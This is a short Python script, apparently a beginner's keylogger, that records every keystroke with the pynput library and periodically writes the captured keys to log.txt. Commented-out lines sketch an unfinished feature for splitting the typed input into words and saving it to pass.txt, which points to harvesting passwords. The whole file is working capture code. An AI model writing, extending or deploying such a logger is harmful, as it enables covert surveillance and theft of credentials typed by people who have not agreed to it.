import pynput
from pynput.keyboard import Key, Listener

count=0
keys=[]
# words=[]

def on_press(key):
    global keys, count
    keys.append(key)
    # words.append(key)
    # if key == Key.space:
    #     save_pass(words)
    #     words.clear()

    # if key == Key.backspace:
    #     words.del last element



    print(f"{format(key)} pressed")
    count+=1
    if count== 10:
        write_file(keys)
        count=0

def write_file(keys):
    with open("log.txt",'w') as f:
        for key in keys:
            if "'" in str(key):
                key=str(key).replace("'","")
            if key==Key.enter or key== Key.space:
                f.write('\n')
            else:
                f.write(str(key))
                # print('worked but check the save')


# def save_pass(words):
#     with open('pass.txt','w')

def on_release(key):
    if key ==Key.esc:
        return False



with Listener(on_press=on_press, on_release=on_release ) as listener:
    listener.join()


